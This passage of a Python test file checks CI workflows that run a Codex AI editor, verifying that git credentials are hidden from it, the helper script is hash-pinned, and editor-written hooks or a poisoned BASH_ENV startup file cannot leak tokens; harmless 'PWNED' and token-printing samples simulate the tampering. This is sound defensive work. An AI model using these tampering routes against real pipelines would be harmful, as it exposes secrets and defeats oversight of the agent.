	result = subprocess.run(["bash", str(HELPER), "hide"], env=env, capture_output=True, text=True)
	assert result.returncode != 0 and "reason=marker_symlink" in result.stderr
	assert "oldsecret" in _git(repo, "remote", "get-url", "origin")
	assert target.read_text() == ""


def test_workflows_pin_scope_before_editor_and_restore_credentials() -> None:
	implement = (WORKFLOWS / "implement.yml").read_text()
	plan = (WORKFLOWS / "plan.yml").read_text()
	assert "editor_git_credentials.sh" in implement and "editor_git_credentials.sh" in plan
	assert "steps.collect_heal_evidence.outputs.present == 'true'" in implement
	for step in ("Preflight destructive-commit guard", "Commit changes"):
		block = implement.split(f"      - name: {step}\n", 1)[1].split("      - name: ", 1)[0]
		assert "HEAL_EVIDENCE_SCOPE_LOCK: ${{ steps.collect_heal_evidence.outputs.present" in block
		assert "HEAL_EVIDENCE_SCOPE_ALLOWLIST: ${{ steps.heal_evidence_scope.outputs.allowlist }}" in block
	assert implement.count('editor_git_credentials hide') == 2
	assert implement.count('editor_git_credentials restore') >= 4
	assert "if: always() && env.SKIP_IMPLEMENT != 'true' && steps.post_codex_syntax_repair.outcome != 'skipped'" in implement
	for workflow in (implement, plan):
		stage = workflow.split("      - name: Stage workflow support files\n", 1)[1].split("      - name: ", 1)[0]
		assert "id: stage_support" in stage
		assert 'echo "editor_git_credentials_sha256=${editor_git_credentials_sha256}" >> "$GITHUB_OUTPUT"' in stage
		assert "EDITOR_GIT_CREDENTIALS_SHA256: ${{ steps.stage_support.outputs.editor_git_credentials_sha256 }}" in workflow
	assert 'bash -c "${plan_runner_src}" run_plan_codex.sh' in plan
	assert 'bash scripts/editor_git_credentials.sh' not in plan
	assert 'bash "${IMPLEMENT_STAGED_SUPPORT_RUN_DIR:-scripts}/editor_git_credentials.sh" restore' not in implement
	for step_name in ("Run Codex implementation", "Attempt post-Codex syntax repair", "Restore git credentials after syntax repair"):
		step = implement.split(f"      - name: {step_name}\n", 1)[1].split("      - name: ", 1)[0]
		assert "EDITOR_GIT_CREDENTIALS_SHA256: ${{ steps.stage_support.outputs.editor_git_credentials_sha256 }}" in step
		assert 'env -u BASH_ENV -u ENV bash -c "${EDITOR_GIT_CREDENTIALS_SCRIPT}" editor_git_credentials.sh "$@"' in step
		assert "reason=pinned_helper_unavailable" in step
	for step_name in ("Attempt post-Codex syntax repair", "Restore git credentials after syntax repair"):
		step = implement.split(f"      - name: {step_name}\n", 1)[1].split("      - name: ", 1)[0]
		assert "BASH_ENV: ''" in step
		assert 'cd "${WORKSPACE_PATH}"' in step
	implementation = implement.split("      - name: Run Codex implementation\n", 1)[1].split("      - name: ", 1)[0]
	assert "BASH_ENV: ''" in implementation
	assert 'cd "${WORKSPACE_PATH}"' in implementation.split('source scripts/gh_helpers.sh', 1)[0]
	assert 'env -u BASH_ENV -u ENV bash -c "${EDITOR_GIT_CREDENTIALS_SCRIPT}"' in (ROOT / "scripts" / "run_plan_codex.sh").read_text()
	assert "--format structured" in implement
	assert "--format structured" in (ROOT / "scripts" / "run_plan_codex.sh").read_text()
	assert "--format structured" not in (WORKFLOWS / "clarify.yml").read_text()
	implementation = implement.split("      - name: Run Codex implementation\n", 1)[1].split("      - name: ", 1)[0]
	assert "GH_TOKEN: ${{ github.token }}" in implementation
	repair = implement.split("      - name: Attempt post-Codex syntax repair\n", 1)[1].split("      - name: ", 1)[0]
	assert "GH_TOKEN: ${{ github.token }}" in repair
	assert repair.count('editor_git_credentials restore') == 2
	assert repair.index('editor_git_credentials restore') < repair.index('echo "::warning::Post-Codex repair attempt')
	assert implement.count('env -u GH_TOKEN -u GH_PAT') == 2
	assert implement.count('-u HEAL_EVIDENCE_DIR -u GITHUB_ENV -u GITHUB_PATH \\') == 2
	plan_runner = (ROOT / "scripts" / "run_plan_codex.sh").read_text()
	assert 'ACTIONS_ID_TOKEN_REQUEST_URL HEAL_EVIDENCE_DIR GITHUB_ENV GITHUB_PATH' in plan_runner
	assert '-u ACTIONS_ID_TOKEN_REQUEST_URL -u HEAL_EVIDENCE_DIR -u GITHUB_ENV -u GITHUB_PATH codex' in plan_runner
	assert "GIT_CONFIG_GLOBAL=/dev/null git -c core.hooksPath=/dev/null -c core.fsmonitor=false -c core.attributesFile=/dev/null commit" in (ROOT / "scripts" / "implement_commit_changes.sh").read_text()
	assert implement.count('git -c core.hooksPath=/dev/null push') == 2
	preflight = implement.split("      - name: Preflight destructive-commit guard\n", 1)[1].split("      - name: ", 1)[0]
	assert preflight.index('editor_git_credentials.sh" check') < preflight.index("GIT_CONFIG_GLOBAL=/dev/null git -c core.hooksPath=/dev/null")
	assert 'GIT_CONFIG_GLOBAL=/dev/null git -c core.hooksPath=/dev/null -c core.fsmonitor=false -c core.attributesFile=/dev/null ls-files --others' in preflight
	push = implement.split("      - name: Push branch\n", 1)[1].split("      - name: ", 1)[0]
	assert "GH_TOKEN: ${{ github.token }}" in push
	assert 'editor_git_credentials.sh" check' in push
	assert "export GIT_CONFIG_GLOBAL=/dev/null" in push
	assert 'https://x-access-token:${GH_TOKEN}@github.com/${{ github.repository }}' in push
	assert "secrets.GH_PAT" not in push
	assert implement.count('git -c core.hooksPath=/dev/null fetch') == 2
	assert 'git -c core.hooksPath=/dev/null rebase' in implement
	create_pr = implement.split("      - name: Create Pull Request\n", 1)[1].split("      - name: ", 1)[0]
	assert 'gh workflow run "${recovery_review_workflow}"' in create_pr
	assert 'recovery_review_workflow="internal-review.yml"' in create_pr
	assert 'recovery_review_workflow="ai-review.yml"' in create_pr
	assert "REVIEW_DISPATCH_REF: ${{ github.event.repository.default_branch || '' }}" in create_pr
	assert '--ref "${REVIEW_DISPATCH_REF}"' in create_pr
	assert "ALLOW_WORKFLOW_EDITS: ${{ vars.ALLOW_WORKFLOW_EDITS || 'true' }}" in implement
	assert '-f "allow_workflow_edits=${ALLOW_WORKFLOW_EDITS:-true}"' in create_pr
	assert '[ "${recovery_inventory_head_ref}" = "${TARGET_BRANCH}" ]' in create_pr
	assert '[ "${recovery_inventory_head_owner,,}" = "${recovery_repo_owner,,}" ]' in create_pr
	assert create_pr.index('gh workflow run "${recovery_review_workflow}"') < create_pr.index('echo "pr_url=${EXISTING_PR}"')


def test_stage_pin_and_in_memory_loader_hash_the_same_bytes() -> None:
	plan = (WORKFLOWS / "plan.yml").read_text()
	implement = (WORKFLOWS / "implement.yml").read_text()
	runner = (ROOT / "scripts" / "run_plan_codex.sh").read_text()
	stage_expression = 'printf \'%s\\n\' "$(cat -- scripts/editor_git_credentials.sh)" | sha256sum | awk \'{print $1}\''
	loader_expression = 'printf \'%s\\n\' "${_egc_body}" | sha256sum | awk \'{print $1}\''
	for workflow in (plan, implement):
		assert stage_expression in workflow
	assert implement.count(loader_expression) == 3
	assert loader_expression in runner
	result = subprocess.run(
		["bash", "-c", "_egc_body=\"$(cat -- scripts/editor_git_credentials.sh)\"; " + loader_expression],
		cwd=ROOT, capture_output=True, text=True, check=True,
	)
	assert result.stdout.strip() == hashlib.sha256(HELPER.read_bytes()).hexdigest()


def test_post_repair_restore_ignores_tampered_editor_writable_copies(tmp_path: Path) -> None:
	workflow = (WORKFLOWS / "implement.yml").read_text()
	step = workflow.split("      - name: Restore git credentials after syntax repair\n", 1)[1].split("      - name: ", 1)[0]
	script = textwrap.dedent(step.split("        run: |\n", 1)[1])
	scripts = tmp_path / "scripts"
	runtime = tmp_path / "runtime"
	support = tmp_path / ".codex-workflow-src" / "scripts"
	for directory in (scripts, runtime, support):
		directory.mkdir(parents=True)
	safe_body = "echo SAFE_RESTORE\n"
	attack_body = "echo PWNED\n"
	(scripts / "editor_git_credentials.sh").write_text(attack_body)
	(runtime / "editor_git_credentials.sh").write_text(attack_body)
	(support / "editor_git_credentials.sh").write_text(safe_body)
	startup_file = tmp_path / "workspace-shell.env"
	startup_file.write_text("echo STARTUP_WITH_TOKEN >&2\n")
	env = dict(os.environ, WORKSPACE_PATH=str(tmp_path), IMPLEMENT_STAGED_SUPPORT_RUN_DIR=str(runtime),
		EDITOR_GIT_CREDENTIALS_SHA256=hashlib.sha256(safe_body.encode()).hexdigest())
	for key in ("BASH_ENV", "ENV"):
		env.pop(key, None)
	# Simulate a tampered startup file after the host step's clean Bash has started.
	command = f'export BASH_ENV="{startup_file}"; ' + script
	result = subprocess.run(["bash", "-c", command], cwd=tmp_path, env=env, capture_output=True, text=True)
	assert result.returncode == 0, result.stderr
	assert result.stdout.strip() == "SAFE_RESTORE"
	assert "STARTUP_WITH_TOKEN" not in result.stderr
	(support / "editor_git_credentials.sh").write_text(attack_body)
	result = subprocess.run(["bash", "-c", command], cwd=tmp_path, env=env, capture_output=True, text=True)
	assert result.returncode != 0
	assert "reason=pinned_helper_unavailable" in result.stderr
	assert "PWNED" not in result.stdout + result.stderr
	assert "STARTUP_WITH_TOKEN" not in result.stderr


def test_editor_poisoned_workspace_startup_is_replaced_before_next_step(tmp_path: Path) -> None:
	workflow = (WORKFLOWS / "implement.yml").read_text()
	marker = 'echo \'BASH_ENV=\' >> "$GITHUB_ENV"'
	restored = 'echo "BASH_ENV=${RUNTIME_DIR}/workspace-shell.env" >> "$GITHUB_ENV"'
	parts = workflow.split(marker)
	assert len(parts) == 4  # implementation and both syntax-repair outcomes
	for index, part in enumerate(parts[1:]):
		assert restored in part
		block = marker + part.split(restored, 1)[0] + restored
		runtime = tmp_path / f"runtime-{index}"
		workspace = tmp_path / f"workspace-{index}"
		runtime.mkdir()
		workspace.mkdir()
		target = tmp_path / f"poison-{index}.env"
		target.write_text("echo STARTUP_WITH_TOKEN >&2\n")
		(runtime / "workspace-shell.env").symlink_to(target)
		github_env = tmp_path / f"github-{index}.env"
		env = dict(os.environ, RUNTIME_DIR=str(runtime), WORKSPACE_PATH=str(workspace),
			GITHUB_ENV=str(github_env), GH_TOKEN="fake-token", BASH_ENV="")
		result = subprocess.run(["bash", "-e", "-c", block], cwd=tmp_path, env=env,
			capture_output=True, text=True)
		assert result.returncode == 0, result.stderr
		assert "STARTUP_WITH_TOKEN" not in result.stderr
		assert target.read_text() == "echo STARTUP_WITH_TOKEN >&2\n"
		assert not (runtime / "workspace-shell.env").is_symlink()
		assert github_env.read_text().splitlines() == ["BASH_ENV=", f"BASH_ENV={runtime}/workspace-shell.env"]
		env["BASH_ENV"] = str(runtime / "workspace-shell.env")
		child = subprocess.run(["bash", "-c", "pwd"], cwd=tmp_path, env=env,
			capture_output=True, text=True)
		assert child.returncode == 0 and child.stdout.strip() == str(workspace)
		assert "STARTUP_WITH_TOKEN" not in child.stderr
	broken_env_file = tmp_path / "github-broken.env"
	bad_env = dict(os.environ, RUNTIME_DIR=str(tmp_path / "missing-runtime"),
		GITHUB_ENV=str(broken_env_file), BASH_ENV="")
	failed_reset = subprocess.run(["bash", "-e", "-c", marker + parts[1].split(restored, 1)[0] + restored],
		cwd=tmp_path, env=bad_env, capture_output=True, text=True)
	assert failed_reset.returncode != 0
	assert broken_env_file.read_text() == "BASH_ENV=\n"


def test_review_workspace_accepts_only_the_known_helper_path() -> None:
	from scripts.review_untrusted_workspace import allowed

	assert allowed("scripts/editor_git_credentials.sh")
	assert not allowed("scripts/other_credentials.sh")


def test_credentialed_commit_disables_editor_written_hook(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "config", "user.email", "test@example.invalid")
	_git(repo, "config", "user.name", "test")
	(repo / "README.md").write_text("safe\n")
	_git(repo, "add", "README.md")
	hook = repo / ".git" / "hooks" / "pre-commit"
	hook.write_text("#!/bin/sh\nexit 1\n")
	hook.chmod(0o755)
	_git(repo, "-c", "core.hooksPath=/dev/null", "commit", "-qm", "safe")
	assert _git(repo, "show", "--format=", "--name-only", "HEAD") == "README.md"


def test_editor_credential_scrub_retains_model_and_thread_settings(tmp_path: Path) -> None:
	command = (
		"CODEX_THREAD_REUSE_STATE_KEY=implement env -u GH_TOKEN -u GH_PAT -u GITHUB_TOKEN "
		"-u TG_BOT_SECRET -u TG_CHAT_ID -u TG_ADMIN_CHAT_ID -u ACTIONS_RUNTIME_TOKEN "
		"-u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL -u HEAL_EVIDENCE_DIR "
		"-u GITHUB_ENV -u GITHUB_PATH env | grep -E '^(GH_TOKEN|GH_PAT|TG_BOT_SECRET|ACTIONS_RUNTIME_TOKEN|HEAL_EVIDENCE_DIR|GITHUB_ENV|GITHUB_PATH|OPENROUTER_API_KEY|CODEX_THREAD_REUSE_STATE_KEY)='"
	)
	env = dict(os.environ, GH_TOKEN="test", GH_PAT="test", TG_BOT_SECRET="test", ACTIONS_RUNTIME_TOKEN="test", HEAL_EVIDENCE_DIR="/tmp/untrusted", GITHUB_ENV="/tmp/runner-env", GITHUB_PATH="/tmp/runner-path", OPENROUTER_API_KEY="model")
	proc = subprocess.run(["bash", "-c", command], env=env, cwd=tmp_path, capture_output=True, text=True)
	assert proc.returncode == 0
	assert proc.stdout.splitlines() == ["OPENROUTER_API_KEY=model", "CODEX_THREAD_REUSE_STATE_KEY=implement"] or set(proc.stdout.splitlines()) == {"OPENROUTER_API_KEY=model", "CODEX_THREAD_REUSE_STATE_KEY=implement"}
